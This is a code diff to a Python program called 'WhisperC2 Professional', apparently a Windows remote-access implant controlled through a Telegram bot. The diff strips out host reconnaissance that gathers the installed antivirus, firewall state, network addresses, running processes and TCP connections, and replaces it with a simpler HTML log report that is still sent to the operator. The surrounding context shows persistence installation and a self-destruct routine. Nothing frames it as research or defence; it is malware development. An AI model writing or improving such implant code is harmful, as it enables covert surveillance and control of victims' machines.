@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # =============================================================================
-# WhisperC2 Professional – Final Production Build (Advanced Telemetry)
+# WhisperC2 Professional – Persistence Fixed, Classic Telemetry
 # =============================================================================
 import telebot, platform, subprocess, threading, time, os, sys, atexit, io, traceback, webbrowser
-import shutil, winreg, ctypes, requests, json, re
+import shutil, winreg, ctypes, requests
 from datetime import datetime
 from pathlib import Path
 from urllib.parse import urlparse
@@ -92,195 +92,24 @@ def save_pid():
 atexit.register(lambda: PID_FILE.unlink(missing_ok=True) if PID_FILE.exists() else None)
 
 # -----------------------------------------------------------------------------
-# Advanced Telemetry – Collect Real System Data
-# -----------------------------------------------------------------------------
-def get_installed_av():
-    try:
-        out = subprocess.run(["powershell", "-Command", "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName"], capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=10)
-        return out.stdout.strip() or "Unknown (possibly Windows Defender)"
-    except:
-        return "Query failed"
-
-def get_firewall_status():
-    try:
-        out = subprocess.run(["netsh", "advfirewall", "show", "allprofiles"], capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=10)
-        if "State" in out.stdout:
-            return out.stdout.splitlines()[0].strip()
-        return "Unknown"
-    except:
-        return "Query failed"
-
-def get_disk_usage():
-    drives = []
-    try:
-        for drive in "CDEFGHIJKLMNOPQRSTUVWXYZ":
-            path = Path(f"{drive}:\\")
-            if path.exists():
-                total = shutil.disk_usage(path).total // (2**30)
-                used = shutil.disk_usage(path).used // (2**30)
-                free = shutil.disk_usage(path).free // (2**30)
-                drives.append(f"{drive}:\\ {total} GB total, {used} GB used, {free} GB free")
-        return "\n".join(drives) if drives else "No fixed drives found"
-    except:
-        return "Query failed"
-
-def get_network_info():
-    try:
-        out = subprocess.run(["powershell", "-Command", "Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike '*Loopback*'} | Select-Object IPAddress,InterfaceAlias | Format-Table -AutoSize"], capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=10)
-        return out.stdout.strip() or "No network adapters"
-    except:
-        return "Query failed"
-
-def get_running_processes():
-    try:
-        out = subprocess.run(["powershell", "-Command", "Get-Process | Sort-Object CPU -Descending | Select -First 20 Name,Id,CPU | Format-Table -AutoSize"], capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=10)
-        return out.stdout.strip() or "No processes"
-    except:
-        return "Query failed"
-
-def get_tcp_connections():
-    try:
-        out = subprocess.run(["netstat", "-an", "-p", "TCP"], capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=10)
-        lines = out.stdout.splitlines()
-        # show only listening or established connections
-        interesting = [l for l in lines if "LISTENING" in l or "ESTABLISHED" in l]
-        return "\n".join(interesting[:30]) or "No connections"
-    except:
-        return "Query failed"
-
-# -----------------------------------------------------------------------------
-# HTML5 Telemetry Report (Interactive, Collapsible Sections)
+# Original Classic Telemetry (Simple & Beautiful)
 # -----------------------------------------------------------------------------
 def generate_telemetry_report(status: str) -> str:
     color = "#4CAF50" if status == "online" else "#F44336"
     emoji = "🟢" if status == "online" else "💀"
     title = f"{SYSTEM_ID} – {status.upper()}"
-
-    # System info
-    sys_info = (
-        f"<strong>OS:</strong> {platform.system()} {platform.release()} (Build {platform.version()})<br>"
-        f"<strong>Architecture:</strong> {platform.machine()}<br>"
-        f"<strong>Hostname:</strong> {platform.node()}<br>"
-        f"<strong>User:</strong> {os.getlogin()}<br>"
-        f"<strong>CPU:</strong> {platform.processor()}<br>"
-        f"<strong>RAM:</strong> {psutil.virtual_memory().total // (1024**3)} GB total<br>"
-        f"<strong>Boot Time:</strong> {datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')}<br>"
-        f"<strong>Persistence:</strong> {'Installed' if install_persistence() else 'Not installed'}"
-    )
-
-    # Security info
-    av = get_installed_av()
-    fw = get_firewall_status()
-    security_info = f"<strong>Antivirus:</strong> {av}<br><strong>Firewall:</strong> {fw}"
-
-    # Build collapsible sections
-    html = f"""<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>{title}</title>
-<style>
-    *{{margin:0;padding:0;box-sizing:border-box}}
-    body{{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:linear-gradient(135deg,#0d1117,#161b22);color:#c9d1d9;min-height:100vh;display:flex;justify-content:center;align-items:flex-start;padding:2rem}}
-    .report-card{{max-width:1000px;width:100%;background:#161b22;border:1px solid #30363d;border-radius:16px;overflow:hidden;box-shadow:0 20px 40px rgba(0,0,0,0.5);margin:0 auto}}
-    .header{{background:{color};padding:2rem;text-align:center}}
-    .header h1{{font-size:2rem;font-weight:600;color:white;margin-bottom:.25rem}}
-    .header .agent{{font-size:1rem;opacity:.9;color:white;font-family:monospace}}
-    .body{{padding:1.5rem}}
-    .section{{margin-bottom:1.5rem;border:1px solid #30363d;border-radius:8px;overflow:hidden}}
-    .section-title{{background:#0d1117;padding:0.75rem 1rem;font-weight:600;color:#58a6ff;cursor:pointer;display:flex;justify-content:space-between;align-items:center}}
-    .section-title::after{{content:'▼';font-size:0.8rem;transition:transform 0.2s}}
-    .section-title.collapsed::after{{transform:rotate(-90deg)}}
-    .section-content{{padding:1rem;display:block}}
-    .section-content.hidden{{display:none}}
-    table{{width:100%;border-collapse:collapse}}
-    th,td{{padding:0.5rem 0.75rem;border-bottom:1px solid #21262d;text-align:left;font-size:0.9rem}}
-    th{{background:#0d1117;color:#8b949e;font-weight:600}}
-    tr:hover td{{background:#1c2128}}
-    .log-level{{font-weight:bold;padding:0.1em 0.5em;border-radius:4px;font-size:0.8rem}}
-    .log-INFO{{color:#58a6ff}}
-    .log-SUCCESS{{color:#3fb950}}
-    .log-WARN{{color:#d29922}}
-    .log-ERROR{{color:#f85149}}
-    pre{{white-space:pre-wrap;font-family:monospace;font-size:0.85rem;background:#0d1117;padding:0.5rem;border-radius:4px;margin:0.5rem 0}}
-</style>
-</head>
-<body>
-<div class="report-card">
-    <div class="header">
-        <h1>{emoji} {title}</h1>
-        <div class="agent">{SYSTEM_ID}</div>
-    </div>
-    <div class="body">
-
-        <!-- System Information -->
-        <div class="section">
-            <div class="section-title" onclick="toggleSection(this)">🖥️ System Information</div>
-            <div class="section-content">{sys_info}</div>
-        </div>
-
-        <!-- Security -->
-        <div class="section">
-            <div class="section-title" onclick="toggleSection(this)">🛡️ Security Status</div>
-            <div class="section-content">{security_info}</div>
-        </div>
-
-        <!-- Disk Usage -->
-        <div class="section">
-            <div class="section-title" onclick="toggleSection(this)">💾 Disk Usage</div>
-            <div class="section-content"><pre>{get_disk_usage()}</pre></div>
-        </div>
-
-        <!-- Network Info -->
-        <div class="section">
-            <div class="section-title" onclick="toggleSection(this)">🌐 Network Configuration</div>
-            <div class="section-content"><pre>{get_network_info()}</pre></div>
-        </div>
-
-        <!-- Processes -->
-        <div class="section">
-            <div class="section-title" onclick="toggleSection(this)">📊 Running Processes (Top 20)</div>
-            <div class="section-content"><pre>{get_running_processes()}</pre></div>
-        </div>
-
-        <!-- TCP Connections -->
-        <div class="section">
-            <div class="section-title" onclick="toggleSection(this)">🔗 Active TCP Connections</div>
-            <div class="section-content"><pre>{get_tcp_connections()}</pre></div>
-        </div>
-
-        <!-- Agent Log -->
-        <div class="section">
-            <div class="section-title" onclick="toggleSection(this)">📝 Agent Startup Log</div>
-            <div class="section-content">
-                <table>
-                    <thead><tr><th>Timestamp</th><th>Level</th><th>Message</th></tr></thead>
-                    <tbody>
-                        {''.join(f'<tr><td>{entry["time"]}</td><td><span class="log-level log-{entry["level"]}">{entry["level"]}</span></td><td>{entry["msg"]}</td></tr>' for entry in log_lines)}
-                    </tbody>
-                </table>
-            </div>
-        </div>
-    </div>
-</div>
-<script>
-    function toggleSection(title) {{
-        const content = title.nextElementSibling;
-        content.classList.toggle('hidden');
-        title.classList.toggle('collapsed');
-    }}
-    // All sections expanded by default
-</script>
-</body>
-</html>"""
-    return html
+    rows = ""
+    with log_lock:
+        for entry in log_lines[-30:]:
+            level_color = {"INFO":"#58a6ff","WARN":"#d29922","ERROR":"#f85149","SUCCESS":"#3fb950"}.get(entry['level'], "#8b949e")
+            rows += f"<tr><td class=\"timestamp\">{entry['time']}</td><td class=\"message\" style=\"color:{level_color}\">[{entry['level']}] {entry['msg']}</td></tr>"
+    return f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>{title}</title><style>
+    *{{margin:0;padding:0;box-sizing:border-box}}body{{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:linear-gradient(135deg,#0d1117,#161b22);color:#c9d1d9;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:2rem}}.report-card{{max-width:900px;width:100%;background:#161b22;border:1px solid #30363d;border-radius:16px;overflow:hidden;box-shadow:0 20px 40px rgba(0,0,0,0.5)}}.header{{background:{color};padding:2rem;text-align:center}}.header h1{{font-size:2rem;font-weight:600;color:white;margin-bottom:.25rem}}.header .agent{{font-size:1rem;opacity:.9;color:white;font-family:monospace}}table{{width:100%;border-collapse:collapse}}th,td{{padding:.75rem 1rem;border-bottom:1px solid #21262d}}th{{text-align:left;background:#0d1117;color:#8b949e}}tr:hover{{background:#1c2128}}</style></head><body><div class="report-card"><div class="header"><h1>{emoji} {title}</h1><div class="agent">{SYSTEM_ID}</div></div><div class="body" style="padding:1.5rem"><table><thead><tr><th>Timestamp</th><th>Event</th></tr></thead><tbody>{rows if rows else '<tr><td colspan="2" style="text-align:center;color:#8b949e;">No log entries</td></tr>'}</tbody></table></div></div></body></html>"""
 
 def send_telemetry(topic_id, status: str) -> bool:
     html_content = generate_telemetry_report(status)
     bio = io.BytesIO(html_content.encode('utf-8'))
     bio.name = f"{SYSTEM_ID}_{status}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
-    # Try topic first, then group, then plain text fallback
     for dest, tid in [("topic", topic_id), ("group", None)]:
         if tid is None and dest == "topic":
             continue
@@ -371,8 +200,6 @@ def self_destruct(topic_id) -> None:
         if persistent.exists():
             persistent.unlink()
             log_success("Persistent file deleted")
-        else:
-            log("Persistent file already absent")
     except Exception as e:
         log_error(f"Failed to delete persistent file: {e}")
     try:
